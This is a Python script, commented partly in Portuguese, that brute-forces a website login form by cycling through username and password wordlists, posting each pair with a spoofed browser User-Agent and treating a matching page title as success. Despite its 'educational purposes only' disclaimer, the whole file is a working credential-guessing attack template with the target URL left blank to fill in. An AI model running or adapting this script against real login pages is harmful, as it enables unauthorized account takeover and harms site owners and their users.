# This bruteforce script is a template and it was made for educational purposes only, please don't use this against other people without their actual consent 

import requests
from bs4 import BeautifulSoup
import sys

# The title of the page when the login is successful goes here, (to get the title search in the website's html for the tag <title> inside the <head> tag)

page_title = ''
url = ''
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'}

def brute(username, password):
    data = {'username' : username, 'password' : password}     
    
    r = requests.post(url, data=data, headers=headers).text #quesição com os dados 
    
    soup = BeautifulSoup(r, 'html.parser') #facilita leitura html para o terminal
    if soup.title.text == page_title: #compara resposta esprada 
        print('|===========================================================================|')
        print(f"          [+] A match was found with {username} : {password} [+]")
        print('|===========================================================================|')
        print('\n')
        sys.exit()
    else:
        pass







def main():
    user_input = str(input('Type username here if you have one, if not press enter >> ') or 'none') #pede para informar um user caso não "none"
    
    if user_input == 'none':        
        users = str(input('file with users >> '))# input wordlist user
        passwords = str(input('with passwords >> '))#input wordlist pass
        print('\n')   
        passwords = [w.strip() for w in open(passwords, 'r').readlines()] #abre o arquivo e le tudo com um loop
        users = [u.strip() for u in open(users, 'r').readlines()] #abre o arquivo e le tudo com um loop 
        user_index = 0
        pass_index = 0
        stop = 0
        
        # stop é uma variável que eu criei para parar quando não houver mais nomes de usuário,
        # caso contrário o código continuaria e geraria um erro IndexError       

        #linha de repetição, enquanto não achar as credenciais corretas não para 
        while stop != len(users):        
            brute(users[user_index], passwords[pass_index])        
            print(f'Tried with >> {users[user_index]} : {passwords[pass_index]} \n') # visivel para usuario ver qual credencial esta sendo testada      
            pass_index += 1        
            if pass_index == len(passwords):
                stop += 1
                pass_index = 0
                user_index += 1
    else:
        # Este else acontece quando o usuário especificou um nome de usuário        
        passwords = str(input('Specify a folder with passwords >> '))     
        passwords = [w.strip() for w in open(passwords, 'r').readlines()]
        for password in passwords:
            brute(user_input, password)
            print(f'Tried with >> {user_input} : {password} \n')
        
# Você precisará adaptar este script caso ele não funcione para algum site,
# lembre-se: cada site é diferente, mas o objetivo é encontrar uma forma
# de detectar quando o login foi bem-sucedido
main()